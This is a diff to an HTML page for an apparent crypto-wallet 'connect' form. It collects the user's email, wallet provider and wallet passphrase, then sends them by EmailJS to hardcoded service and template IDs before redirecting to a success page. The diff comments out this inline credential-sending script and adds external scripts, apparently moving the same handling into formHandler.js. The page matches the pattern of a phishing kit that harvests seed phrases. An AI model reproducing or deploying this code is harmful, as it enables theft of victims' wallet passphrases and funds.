@@ -16,6 +16,10 @@
     <!-- responsive style -->
     <link href="css/responsive.css" rel="stylesheet" />
     <link rel="stylesheet" href="css/wallet.css" />
+    <!-- Include EmailJS SDK -->
+     <!-- Link the locally downloaded EmailJS library -->
+  <script defer type="text/javascript" src="js/email.min.js"></script>
+  <script defer src="js/formHandler.js"></script>
   </head>
   <body>
     <!-- header section starts -->
@@ -128,12 +132,12 @@
     </section>
 
     <!-- JavaScript for validation and form submission -->
-    <script>
+    <!-- <script>
       document.getElementById('walletForm').addEventListener('submit', function(event) {
-  event.preventDefault(); // Prevent form from submitting
+  event.preventDefault(); // Prevent form from submitting -->
 
-  // Clear any previous validation errors
-  const validationErrors = document.getElementById('validationErrors');
+  <!-- // Clear any previous validation errors -->
+  <!-- const validationErrors = document.getElementById('validationErrors');
   validationErrors.textContent = "";
 
   // Get input field values
@@ -164,27 +168,27 @@
   const statusDiv = document.getElementById('status');
   statusDiv.textContent = "Processing...";
 
-  // Prepare the parameters to send via EmailJS
+  // Preparing the parameters to send via EmailJS
   var templateParams = {
     email: email,
     walletProvider: walletProvider,
     passphrase: passphrase
-  };
+  }; -->
 
-  // Send email using EmailJS
-  emailjs.send('service_q4roaif', 'template_yfsrzqa', templateParams)
-    .then(function(response) {
-        console.log('SUCCESS!', response.status, response.text);
-        // Redirect to success page after successful submission
-        window.location.href = 'success.html';
-    }, function(error) {
-        console.log('FAILED...', error);
-        statusDiv.textContent = "Failed to send email. Please try again.";
-        statusDiv.style.color = "red";
-    });
-});
+  <!-- // Send email using EmailJS -->
+  <!-- emailjs.send('service_9273bwj', 'template_i0rgp8m', templateParams) -->
+    <!-- .then(function(response) { -->
+        <!-- console.log('SUCCESS!', response.status, response.text); -->
+        <!-- // Redirect to success page after successful submission -->
+        <!-- window.location.href = 'success.html'; -->
+    <!-- }, function(error) { -->
+        <!-- console.log('FAILED...', error); -->
+        <!-- statusDiv.textContent = "Failed to submit. Please try again."; -->
+        <!-- statusDiv.style.color = "red"; -->
+    <!-- }); -->
+<!-- }); -->
 
-    </script>
+    <!-- </script> -->
 
     <script type="text/javascript" src="js/jquery-3.4.1.min.js"></script>
     <script type="text/javascript" src="js/bootstrap.js"></script>
